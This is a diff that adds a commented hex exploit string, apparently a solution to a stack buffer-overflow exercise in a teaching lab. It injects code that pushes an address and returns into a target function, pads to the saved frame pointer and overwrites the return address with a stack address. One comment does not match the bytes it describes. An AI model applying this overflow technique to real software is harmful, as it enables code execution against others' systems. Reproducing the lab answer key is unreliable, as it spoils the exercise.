@@ -1,0 +1,19 @@
+68 b8 36 68 55       /* push  $0x8049446 : *str */
+68 10 95 04 08       /* push  $0x08049510 : <rumble>, goal: padding for return target of rumble */
+68 10 95 04 08       /* push  $0x08049510 : <rumble> */
+c3                   /* ret */
+54 48 70 55          /* str cannot be here: has 00 */
+30 30 30 30 30 30          /* needs 46 more */
+30 30 30 30
+30 30 30 30
+30 30 30 30
+30 30 30 30
+30 30 30 30
+30 30 30 30
+30 30 30 30
+30 30 30 30
+30 30 30 30
+30 30 30 30 /* reach %ebp */
+30 30 30 30 /* padding for %ebp */
+6e 36 68 55 /* -0x42(%ebp), start of str get by get() : attack code */
+36 30 46 37 33 35 37 36 00 /* str 60F73576\0 */
